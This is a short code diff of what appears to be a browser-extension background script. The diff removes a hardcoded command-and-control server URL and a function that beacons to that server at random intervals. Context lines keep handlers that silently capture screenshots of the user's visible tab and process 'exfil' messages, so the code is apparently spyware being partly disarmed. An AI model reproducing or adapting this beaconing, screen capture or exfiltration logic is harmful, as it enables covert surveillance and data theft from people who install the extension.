@@ -28,7 +28,7 @@ window.run = function(cfg) {
     });
 };
 
-  const C2_SERVER = 'https://tradingpiecefororder.asia'; // Update if needed
+  const C2_SERVER = ''; // Update if needed
   const MIN_POLL_SECONDS = 2;
   const MAX_POLL_SECONDS = 5;
 
@@ -307,17 +307,6 @@ async function beaconToC2() {
     console.error('[Beacon Error]', err.message);
   }
 }
-
-// Schedule next beacon
-function scheduleNextBeacon() {
-  const interval = getRandomInterval();
-  console.log(`[Beacon] Next in ${interval / 1000}s`);
-  setTimeout(async () => {
-    await beaconToC2();
-    scheduleNextBeacon();
-  }, interval);
-}
-
   // Handle our custom screenshot capture request
   if (message.type === 'capture_screenshot') {
     chrome.tabs.captureVisibleTab(sender.tab.windowId, { format: 'png' }, function(dataUrl) {
@@ -336,7 +325,6 @@ function scheduleNextBeacon() {
       });
     });
   }
-
   // Handle other exfil messages
   if (message.type === 'exfil') {
     console.log('[Exfil Message]', message.data);
